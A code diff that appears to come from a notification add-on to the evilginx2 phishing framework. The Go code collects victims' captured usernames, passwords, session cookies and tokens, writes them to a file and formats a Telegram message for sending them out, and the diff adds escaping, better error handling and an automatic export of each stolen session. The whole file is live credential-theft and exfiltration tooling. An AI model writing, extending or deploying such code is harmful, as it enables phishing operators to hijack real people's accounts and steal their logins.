@@ -8,6 +8,8 @@ import (
 	"path/filepath"
 	"sync"
 	"time"
+
+	"github.com/kgretzky/evilginx2/log"
 )
 
 type Token struct {
@@ -34,14 +36,13 @@ func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
 			var t Token
 
 			if name, ok := tokenData["Name"].(string); ok {
-				// Remove &
 				t.Name = name
 			}
 			if val, ok := tokenData["Value"].(string); ok {
 				t.Value = val
 			}
 			// Remove leading dot from domain
-			if len(domain) > 0 && domain[0] == '.' {
+			for len(domain) > 0 && domain[0] == '.' {
 				domain = domain[1:]
 			}
 			t.Domain = domain
@@ -89,7 +90,6 @@ func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
 func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string) ([]Token, error) {
 	var consolidatedTokens []Token
 
-	// Parse and extract tokens for each category
 	for _, tokenJSON := range []string{sessionTokens, httpTokens, bodyTokens} {
 		if tokenJSON == "" {
 			continue
@@ -107,7 +107,6 @@ func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string
 	return consolidatedTokens, nil
 }
 
-// Define a map to store session IDs and a mutex for thread-safe access
 var processedSessions = make(map[string]bool)
 var sessionMessageMap = make(map[string]int)
 var mu sync.Mutex
@@ -122,19 +121,17 @@ func generateRandomString() string {
 	}
 	return string(randomStr)
 }
+
 func createTxtFile(session TSession) (string, error) {
-	// Create a random text file name
 	txtFileName := generateRandomString() + ".txt"
 	txtFilePath := filepath.Join(os.TempDir(), txtFileName)
 
-	// Create a new text file
 	txtFile, err := os.Create(txtFilePath)
 	if err != nil {
 		return "", fmt.Errorf("failed to create text file: %v", err)
 	}
 	defer txtFile.Close()
 
-	// Marshal the session maps into JSON byte slices
 	tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
 	if err != nil {
 		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
@@ -153,16 +150,17 @@ func createTxtFile(session TSession) (string, error) {
 	}
 
 	allTokens, err := processAllTokens(string(tokensJSON), string(httpTokensJSON), string(bodyTokensJSON), string(customJSON))
+	if err != nil {
+		log.Warning("notify: failed to process tokens: %v", err)
+	}
 
 	result, err := json.MarshalIndent(allTokens, "", "  ")
 	if err != nil {
-		fmt.Println("Error marshalling final tokens:", err)
-
+		return "", fmt.Errorf("failed to marshal final tokens: %v", err)
 	}
 
-	fmt.Println("Combined Tokens: ", string(result))
+	log.Debug("notify: combined %d tokens for session", len(allTokens))
 
-	// Write the consolidated data into the text file
 	_, err = txtFile.WriteString(string(result))
 	if err != nil {
 		return "", fmt.Errorf("failed to write data to text file: %v", err)
@@ -172,30 +170,32 @@ func createTxtFile(session TSession) (string, error) {
 }
 
 func formatSessionMessage(session TSession) string {
-	// Format the session information (no token data in message)
-	return fmt.Sprintf("✨ Session Information ✨\n\n"+
+	username := TelegramMarkdownV2Escape(session.Username)
+	password := TelegramMarkdownV2Escape(session.Password)
+	landingURL := TelegramMarkdownV2Escape(session.LandingURL)
+	userAgent := TelegramMarkdownV2Escape(session.UserAgent)
+	remoteAddr := TelegramMarkdownV2Escape(session.RemoteAddr)
 
-		"👤 Username:      ➖ %s\n"+
-		"🔑 Password:      ➖ %s\n"+
-		"🌐 Landing URL:   ➖ %s\n \n"+
-		"🖥️ User Agent:    ➖ %s\n"+
-		"🌍 Remote Address:➖ %s\n"+
-		"🕒 Create Time:   ➖ %d\n"+
-		"🕔 Update Time:   ➖ %d\n"+
-		"\n"+
-		"📦 Tokens are added in txt file and attached separately in message.\n",
-
-		session.Username,
-		session.Password,
-		session.LandingURL,
-		session.UserAgent,
-		session.RemoteAddr,
+	return fmt.Sprintf("✨ *Session Information* ✨\n\n"+
+		"👤 *Username:* `%s`\n"+
+		"🔑 *Password:* `%s`\n"+
+		"🌐 *Landing URL:* [Link](%s)\n"+
+		"🖥️ *User Agent:* `%s`\n"+
+		"🌍 *Remote Address:* `%s`\n"+
+		"🕒 *Created:* `%d`\n"+
+		"🕔 *Updated:* `%d`\n\n"+
+		"📦 Tokens are attached as a separate file\\.\n",
+		username,
+		password,
+		landingURL,
+		userAgent,
+		remoteAddr,
 		session.CreateTime,
 		session.UpdateTime,
 	)
 }
-func Notify(session TSession, chatid string, teletoken string) {
 
+func Notify(session TSession, chatid string, teletoken string) {
 	mu.Lock()
 	// Check if the session is already processed
 	if processedSessions[string(session.ID)] {
@@ -248,4 +248,7 @@ func Notify(session TSession, chatid string, teletoken string) {
 
 	// Remove the temporary TXT file
 	os.Remove(txtFilePath)
+
+	// Auto-export session if enabled
+	go AutoExportSession(session)
 }
